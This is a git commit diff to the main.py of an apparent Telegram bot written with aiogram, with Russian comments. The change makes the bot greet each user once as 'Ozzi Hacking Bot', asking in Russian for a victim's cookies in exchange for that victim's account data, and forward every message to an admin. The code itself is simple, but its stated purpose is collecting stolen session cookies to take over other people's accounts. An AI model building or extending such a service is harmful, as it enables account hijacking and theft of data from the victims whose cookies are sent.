c0bdf655bacda87ba810171324a645069dab8e2d
wonloa565 <epicgyt1@gmail.com>
2025-02-13 23:00:13 +0300

    Добавлены исправления

--- main.py
+++ main.py
@@ -3,19 +3,27 @@ import asyncio
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import Message
 
-TOKEN = os.getenv("TOKEN")  # Токен бота (Railway переменная)
-ADMIN_ID = os.getenv("ADMIN_ID")  # Твой Telegram ID
+TOKEN = os.getenv("TOKEN")  # Токен бота
+ADMIN_ID = os.getenv("ADMIN_ID")  # ID Админа (если есть)
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
 
-# Обрабатываем входящие сообщения
+# Список пользователей, которым уже отправлен ответ
+replied_users = set()
+
 @dp.message()
 async def forward_to_admin(message: Message):
-    """Пересылает сообщение админу и отправляет автоответ пользователю"""
+    """Пересылает сообщение админу и отвечает только 1 раз"""
+    user_id = message.from_user.id
+    
+    if user_id not in replied_users:
+        replied_users.add(user_id)  # Запоминаем пользователя
+        await message.answer("Привет, это Ozzi Hacking Bot! Пришли куки жертвы и мы скоро дадим его данные аккаунт тебе :)")
+    
+    # Пересылаем админу всегда (если ADMIN_ID указан)
     if ADMIN_ID:
         await bot.send_message(ADMIN_ID, f"Сообщение от {message.from_user.full_name} (@{message.from_user.username}):\n\n{message.text}")
-    await message.answer("Спасибо! Ваше сообщение получено, мы скоро ответим.")
 
 async def main():
     """Запуск бота"""
